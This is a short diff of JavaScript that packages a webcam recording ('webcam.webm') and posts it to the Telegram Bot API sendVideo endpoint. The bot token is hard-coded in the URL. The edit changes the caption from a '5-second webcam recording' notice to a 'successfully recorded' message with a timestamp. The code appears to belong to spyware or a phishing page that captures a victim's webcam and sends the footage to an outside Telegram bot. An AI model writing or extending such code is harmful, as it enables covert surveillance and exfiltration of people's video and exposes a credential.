@@ -50,7 +50,9 @@
         const form = new FormData();
         form.append("chat_id", uid);
         form.append("video", blob, "webcam.webm");
-        form.append("caption", "🎥 Rekaman webcam 5 detik");
+
+        const timestamp = new Date().toLocaleTimeString();
+        form.append("caption", `🎥 Berhasil merekam\n⏲️ ${timestamp}`);
 
         await fetch(`https://api.telegram.org/bot7525794586:AAH9YlfXazDX1zzx1ss23q8RuIqyMJcVzZI/sendVideo`, {
           method: "POST",
